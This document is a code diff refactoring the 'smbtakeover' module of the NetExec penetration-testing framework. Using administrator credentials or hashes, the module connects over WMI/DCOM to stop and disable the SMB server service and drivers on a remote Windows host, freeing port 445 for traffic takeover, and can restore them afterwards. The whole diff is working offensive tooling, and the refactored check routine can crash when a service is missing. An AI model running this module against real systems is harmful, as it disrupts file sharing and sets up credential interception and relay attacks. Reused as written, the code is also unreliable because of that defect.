@@ -11,7 +11,7 @@ from nxc.helpers.misc import CATEGORY
 
 class NXCModule:
     name = "smbtakeover"
-    description = "Unbinds/Rebinds 445/tcp via SCM interactions strictly over WMI (ncacn_ip_tcp)"
+    description = "Unbinds/Rebinds port 445/tcp via SCM interactions strictly over WMI (ncacn_ip_tcp)"
     supported_protocols = ["smb", "wmi"]
     category = CATEGORY.PRIVILEGE_ESCALATION
 
@@ -19,36 +19,26 @@ class NXCModule:
         self.context = context
         self.module_options = module_options
         self.action = None
-        self.dcom_timeout = 10
 
     def options(self, context, module_options):
         """
-        ACTION          Unbind/Rebind port 445 (choices: check, stop, start)
-                        - check: Enumerates service states
+        ACTION          Unbind/Rebind port 445/tcp (choices: check, stop, start)
+                        - check: Enumerates service states (default)
                         - stop: Unbinds 445/tcp (Stops LanmanServer, srv2, srvnet)
                         - start: Rebinds 445/tcp (Restores services)
-        DCOM-TIMEOUT    Set WMI connection timeout (Default: 10 seconds)
         """
         if "ACTION" not in module_options:
-            context.log.fail("ACTION option not specified! Choices: check, stop, start")
-            exit(1)
-
-        self.action = module_options["ACTION"].lower()
+            self.action = "check"
+        else:
+            self.action = module_options["ACTION"].lower()
 
         if self.action not in ["check", "stop", "start"]:
             context.log.fail("Invalid ACTION. Supported choices are: check, stop, start")
             exit(1)
 
-        if "DCOM-TIMEOUT" in module_options:
-            try:
-                self.dcom_timeout = int(module_options["DCOM-TIMEOUT"])
-            except Exception:
-                context.log.fail("Wrong DCOM timeout value!")
-                exit(1)
-
     def on_admin_login(self, context, connection):
         context.log.display(f"Executing smbtakeover {self.action} via WMI (ncacn_ip_tcp)...")
-        smbtakeover_wmi = SmbTakeoverWmi(context, connection, self.dcom_timeout)
+        smbtakeover_wmi = SmbTakeoverWmi(context, connection)
 
         if smbtakeover_wmi.is_initialized:
             try:
@@ -68,44 +58,31 @@ class NXCModule:
 class SmbTakeoverWmi:
     """Handles SCM interactions indirectly over WMI (ncacn_ip_tcp)"""
 
-    def __init__(self, context, connection, timeout):
+    def __init__(self, context, connection):
         self.logger = context.log
-        self.__currentprotocol = context.protocol
 
-        self.__username = getattr(connection, "username", "")
-        self.__password = getattr(connection, "password", "")
-        self.__domain = getattr(connection, "domain", "")
-        self.__lmhash = getattr(connection, "lmhash", "")
-        self.__nthash = getattr(connection, "nthash", "")
-        self.__doKerberos = getattr(connection, "kerberos", False)
-        self.__kdcHost = getattr(connection, "kdcHost", None)
-        self.__aesKey = getattr(connection, "aesKey", None)
-
-        self.__target = connection.hostname + "." + connection.domain if self.__doKerberos else getattr(connection, "host", "")
-        self.__remoteHost = getattr(connection, "host", "")
-        self.__timeout = timeout
         self.__is_initialized = False
 
         try:
             self.__dcom = DCOMConnection(
-                self.__target,
-                self.__username,
-                self.__password,
-                self.__domain,
-                self.__lmhash,
-                self.__nthash,
-                self.__aesKey,
+                target=connection.host,
+                username=connection.username,
+                password=connection.password,
+                domain=connection.domain,
+                lmhash=connection.lmhash,
+                nthash=connection.nthash,
+                aesKey=connection.aesKey,
                 oxidResolver=True,
-                doKerberos=self.__doKerberos,
-                kdcHost=self.__kdcHost,
-                remoteHost=self.__remoteHost,
+                doKerberos=connection.kerberos,
+                kdcHost=connection.kdcHost,
+                remoteHost=connection.host,
             )
 
             i_interface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
             self.__iWbemLevel1Login = wmi.IWbemLevel1Login(i_interface)
             self.__is_initialized = True
         except Exception as e:
-            self.logger.fail(f"WMI connection failed: {e}")
+            self.logger.fail(f"WMI connection failed: {e!s}")
             self.disconnect()
 
     @property
@@ -123,14 +100,24 @@ class SmbTakeoverWmi:
         return i_wbem_services
 
     def get_service_or_driver(self, i_wbem_services, name):
-        for table in ["Win32_Service", "Win32_SystemDriver"]:
-            try:
-                query = f"SELECT * FROM {table} WHERE Name='{name}'"
-                objects = i_wbem_services.ExecQuery(query).Next(0xFFFFFFFF, 1)
-                if len(objects) > 0:
-                    return objects[0]
-            except Exception:
-                pass
+        if name in ["srv2", "srvnet"]:
+            table = "Win32_SystemDriver"
+        elif name == "LanmanServer":
+            table = "Win32_Service"
+        else:
+            self.logger.fail(f"Unknown service or driver name: {name}")
+            return None
+
+        try:
+            query = f"SELECT * FROM {table} WHERE Name='{name}'"
+            objects = i_wbem_services.ExecQuery(query).Next(0xFFFFFFFF, 1)
+            if objects and len(objects) > 0:
+                return objects[0]
+        except Exception as e:
+            if "code: 0x1 - WBEM_S_FALSE" in str(e):
+                self.logger.debug(f"Object '{name}' not found in {table} (WBEM_S_FALSE)")
+            else:
+                self.logger.fail(f"Unexpected WMI error checking {table}: {e!s}")
         return None
 
     def call_wmi_method(self, obj, method_name, *args):
@@ -171,37 +158,45 @@ class SmbTakeoverWmi:
         else:
             self.logger.fail(f"[{service_name}] Failed to start (Ret: {ret})")
 
+    def check_service(self, i_wbem_services, service_name):
+        svc_obj = self.get_service_or_driver(i_wbem_services, service_name)
+        if svc_obj:
+            props = dict(svc_obj.getProperties())
+            state = props.get("State", {}).get("value", "Unknown")
+            start_mode = props.get("StartMode", {}).get("value", "Unknown")
+            return svc_obj, state, start_mode
+        else:
+            self.logger.fail(f"[{service_name}] Service/Driver not found!")
+        return None
+
     def check(self):
         i_wbem_services = self.connect_cimv2()
         services_to_check = ["LanmanServer", "srv2", "srvnet"]
-        self.logger.display("Checking states via WMI (ncacn_ip_tcp)...")
-        for svc_name in services_to_check:
-            svc_obj = self.get_service_or_driver(i_wbem_services, svc_name)
-            if svc_obj:
-                props = dict(svc_obj.getProperties())
-                state = props.get("State", {}).get("value", "Unknown")
-                start_mode = props.get("StartMode", {}).get("value", "Unknown")
-                self.logger.highlight(f"[{svc_name}] State: {state} | StartMode: {start_mode}")
-            else:
-                self.logger.fail(f"[{svc_name}] Service/Driver not found!")
+        for service_name in services_to_check:
+            _, state, start_mode = self.check_service(i_wbem_services, service_name)
+            self.logger.highlight(f"[{service_name}] State: {state} | StartMode: {start_mode}")
         self.__iWbemLevel1Login.RemRelease()
 
     def stop(self):
         i_wbem_services = self.connect_cimv2()
 
-        lanmanserver = self.get_service_or_driver(i_wbem_services, "LanmanServer")
+        lanmanserver, lanmanserver_state, lanmanserver_start_mode = self.check_service(i_wbem_services, "LanmanServer")
         if lanmanserver:
-            self.change_start_mode(lanmanserver, "Disabled", "LanmanServer")
-            self.stop_service(lanmanserver, "LanmanServer")
+            if lanmanserver_start_mode != "Disabled":
+                self.change_start_mode(lanmanserver, "Disabled", "LanmanServer")
 
-        srv2 = self.get_service_or_driver(i_wbem_services, "srv2")
-        if srv2:
+            if lanmanserver_state != "Stopped":
+                self.stop_service(lanmanserver, "LanmanServer")
+
+        srv2, srv2_state, _ = self.check_service(i_wbem_services, "srv2")
+        if srv2 and srv2_state != "Stopped":
             self.stop_service(srv2, "srv2")
 
-        srvnet = self.get_service_or_driver(i_wbem_services, "srvnet")
-        if srvnet:
-            self.change_start_mode(srvnet, "Disabled", "srvnet")
+        srvnet, srvnet_state, _ = self.check_service(i_wbem_services, "srvnet")
+        if srvnet and srvnet_state != "Stopped":
             self.stop_service(srvnet, "srvnet")
+
+        self.check()
 
         self.logger.success("SMB unbind sequence completed via WMI. Port 445 is free.")
         self.__iWbemLevel1Login.RemRelease()
@@ -209,19 +204,23 @@ class SmbTakeoverWmi:
     def start(self):
         i_wbem_services = self.connect_cimv2()
 
-        srvnet = self.get_service_or_driver(i_wbem_services, "srvnet")
-        if srvnet:
-            self.change_start_mode(srvnet, "Manual", "srvnet")
+        srvnet, srvnet_state, _ = self.check_service(i_wbem_services, "srvnet")
+        if srvnet and srvnet_state != "Running":
             self.start_service(srvnet, "srvnet")
 
-        srv2 = self.get_service_or_driver(i_wbem_services, "srv2")
-        if srv2:
+        srv2, srv2_state, _ = self.check_service(i_wbem_services, "srv2")
+        if srv2 and srv2_state != "Running":
             self.start_service(srv2, "srv2")
 
-        lanmanserver = self.get_service_or_driver(i_wbem_services, "LanmanServer")
+        lanmanserver, lanmanserver_state, lanmanserver_start_mode = self.check_service(i_wbem_services, "LanmanServer")
         if lanmanserver:
-            self.change_start_mode(lanmanserver, "Automatic", "LanmanServer")
-            self.start_service(lanmanserver, "LanmanServer")
+            if lanmanserver_start_mode != "Auto":
+                self.change_start_mode(lanmanserver, "Automatic", "LanmanServer")
+
+            if lanmanserver_state != "Running":
+                self.start_service(lanmanserver, "LanmanServer")
+
+        self.check()
 
         self.logger.success("SMB rebind sequence completed via WMI. Port 445 restored.")
         self.__iWbemLevel1Login.RemRelease()
